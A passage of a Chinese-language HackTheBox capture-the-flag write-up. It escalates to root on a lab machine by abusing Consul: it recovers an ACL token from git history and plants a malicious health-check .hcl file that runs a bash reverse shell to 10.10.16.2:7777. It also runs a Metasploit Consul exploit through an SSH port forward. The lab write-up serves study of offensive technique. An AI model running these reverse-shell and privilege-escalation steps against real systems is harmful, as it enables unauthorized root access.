src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562939200-82c255b9-182a-48a3-b902-311ab0733c28.png#averageHue=%232e323a&clientId=u51e10fcf-d949-4&from=paste&height=127&id=u6d74c547&name=image.png&originHeight=159&originWidth=696&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36080&status=done&style=none&taskId=u08aceb22-8e3b-458d-93f0-bd497d6d28b&title=&width=556.8" alt="image.png"><br>在这里文件所有组和所有者都是developer，因此权限是足够的：<br><code>git checkout c982db8eff6f10f8f3a7d802f79f2705e7a21b55</code>回到上一个版本之后，可以发现刚刚的文件多出了token：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563079327-048d72c6-3810-4abf-8c52-5abccf9baead.png#averageHue=%23282b34&clientId=u51e10fcf-d949-4&from=paste&height=153&id=u84fde134&name=image.png&originHeight=191&originWidth=1016&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51530&status=done&style=none&taskId=u9b61ebd6-2d85-4d37-9d95-868005d1435&title=&width=812.8" alt="image.png"></p>
+<h2 id="Consul-Health-check"><a href="#Consul-Health-check" class="headerlink" title="Consul Health check"></a>Consul Health check</h2><p>尝试运行指令<code>consul kv put test value</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563243155-96754b49-55b7-4a81-8a9c-dd068cb0eee8.png#averageHue=%232a2e37&clientId=u51e10fcf-d949-4&from=paste&height=80&id=uc8f7cf2c&name=image.png&originHeight=100&originWidth=1098&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30290&status=done&style=none&taskId=u59bdc658-8aaa-440c-a7e3-6689b2f8786&title=&width=878.4" alt="image.png"><br>显示没有权限<br>在上面的官网文档中，说了需要将token导入环境变量才可使用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563141968-722862d9-5005-4217-9d7d-b62e32775e38.png#averageHue=%23fefdfc&clientId=u51e10fcf-d949-4&from=paste&height=349&id=ubea4a018&name=image.png&originHeight=436&originWidth=1230&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48125&status=done&style=none&taskId=u90d931fa-9e95-4e19-b4bf-f6be55a7f05&title=&width=984" alt="image.png"><br>所以<code>export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5</code>之后再运行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563342322-6d974ad6-d9fe-4797-95ac-cd8242ff3128.png#averageHue=%23272c36&clientId=u51e10fcf-d949-4&from=paste&height=121&id=u899d4370&name=image.png&originHeight=151&originWidth=804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34557&status=done&style=none&taskId=ue343d2d4-6cce-4aab-887c-fa2c4738213&title=&width=643.2" alt="image.png"><br>现在可以使用consul命令了，就该思考如何提权，运行<code>ps aux|grep consul</code>查看该服务进程：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563402533-74953a15-3e41-474f-9283-1c03018d6874.png#averageHue=%232a2d35&clientId=u51e10fcf-d949-4&from=paste&height=78&id=u73ffb5c8&name=image.png&originHeight=98&originWidth=1050&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26332&status=done&style=none&taskId=u27d256d4-cbf8-4967-9e82-5c2ac6fa78f&title=&width=840" alt="image.png"><br>意外的发现该服务是由root用户执行的，并且可以看到配置文件夹位置<code>/etc/consul.d/</code>，我们进入看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563473258-e0c6e396-06d8-40df-8f23-92cea46fdf2c.png#averageHue=%232e353d&clientId=u51e10fcf-d949-4&from=paste&height=146&id=u52fe3a72&name=image.png&originHeight=182&originWidth=570&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42438&status=done&style=none&taskId=ub77a4446-c4f9-4a73-97fc-9d21c802a7d&title=&width=456" alt="image.png"><br>发现config.d目录属于我们用户组，有写的权限，并且猜都猜得到这是配置文件位置，从官网得知，consul有一种健康检查的机制，可以指定服务启动时我们运行的指令，而健康检查是通过配置<code>.hcl</code>配置文件完成的：<br><a target="_blank" rel="noopener" href="https://developer.hashicorp.com/consul/docs/discovery/checks#script-check">https://developer.hashicorp.com/consul/docs/discovery/checks#script-check</a><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676563855746-56719153-17cf-48a4-9e85-7f74704c1a62.png#averageHue=%23fdf7e4&clientId=u51e10fcf-d949-4&from=paste&height=513&id=u42f5f824&name=image.png&originHeight=641&originWidth=1350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57938&status=done&style=none&taskId=u4829c353-ae92-48bd-8b66-ddee9796b15&title=&width=1080" alt="image.png"><br>可以利用健康检查机制创建恶意<code>hcl</code>文件，从而反弹shell获取root权限(服务由root运行)，仿照上述官方例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">check = &#123;</span><br><span class="line">  id = &quot;evil&quot;</span><br><span class="line">  name = &quot;evilshell&quot;</span><br><span class="line">  args = [&quot;/bin/bash&quot;,&quot;/tmp/evil.sh&quot;]</span><br><span class="line">  interval = &quot;10s&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>evil.sh内容就是反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.16.2/7777 &lt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>在<code>conf.d</code>目录下创建完恶意hcl文件后即可<code>consul reload</code>重启服务，然后启动时就会运行evil.sh脚本,我们只需本地监听<code>nc -lvnp 7777</code>即可，这里没截图是因为靶机给我搞的有点问题，弹不回来需要重启，但是我懒</p>
+<h1 id="MSF直接获取ROOT权限"><a href="#MSF直接获取ROOT权限" class="headerlink" title="MSF直接获取ROOT权限"></a>MSF直接获取ROOT权限</h1><p>在msf搜索有关consul的exploit：<br><code>search consul</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676564429405-8894eefb-55e9-4502-b811-54786664b527.png#averageHue=%232d2f36&clientId=u51e10fcf-d949-4&from=paste&height=112&id=u0ba6fdaa&name=image.png&originHeight=140&originWidth=1107&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52286&status=done&style=none&taskId=u59564a09-19f9-4956-9f1f-914f14ce69e&title=&width=885.6" alt="image.png"><br>得到2个exploit，我们选择<code>exploit/multi/misc/consul_service_exec</code>,然后查看有关参数：<br><code>use exploit/multi/misc/consul_service_exec</code><br><code>show options</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676564489196-c088719f-ac64-43a6-9385-45d3ebc6a6af.png#averageHue=%232a2c32&clientId=u51e10fcf-d949-4&from=paste&height=390&id=u07aa153a&name=image.png&originHeight=488&originWidth=1115&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102165&status=done&style=none&taskId=u46a0bc4a-82d2-4048-81fc-4d14c56c100&title=&width=892" alt="image.png"><br>需要指定rhost,rport,lhost,lport，并且rhost必须是8500，ACL_TOKEN说是不需要，但是我们执行命令时需要，因此也需要导入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676564658111-72a3560c-5cd2-4ac3-9216-7ccafd132ce5.png#averageHue=%232a2c33&clientId=u51e10fcf-d949-4&from=paste&height=394&id=u74464394&name=image.png&originHeight=493&originWidth=1108&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=107000&status=done&style=none&taskId=u32d5c18a-1f84-4dbc-b00e-751a2e71c5b&title=&width=886.4" alt="image.png"><br>由于目标没有8500端口，因此会失败，所以要做一个SS本地端口转发<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676564764765-9de87379-ea4f-475e-9c86-257f6d326745.png#averageHue=%23f4f2db&clientId=u51e10fcf-d949-4&from=paste&height=504&id=u13262acf&name=image.png&originHeight=630&originWidth=1563&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75721&status=done&style=none&taskId=u7f171e1c-d9af-4675-9d66-0bb59c4f38b&title=&width=1250.4" alt="image.png"><br><code>ssh -L 8500:127.0.0.1:8500 developer@10.10.11.183</code>（kali机器运行），所以我们才把msf的rhost设为127.0.0.1，我们做了一层通道：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676564893709-cf168ca6-d625-4b2f-bde3-e9e5807ec41a.png#averageHue=%23292b32&clientId=u51e10fcf-d949-4&from=paste&height=166&id=ufabd052a&name=image.png&originHeight=207&originWidth=1084&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31473&status=done&style=none&taskId=u5c72b043-d47d-4de3-8b53-f48bf89f26d&title=&width=867.2" alt="image.png"><br>完美结束</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/HackTheBox/" class="tag">#HackTheBox</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/Stocker/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Stocker</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/Shoppy/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Shoppy</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
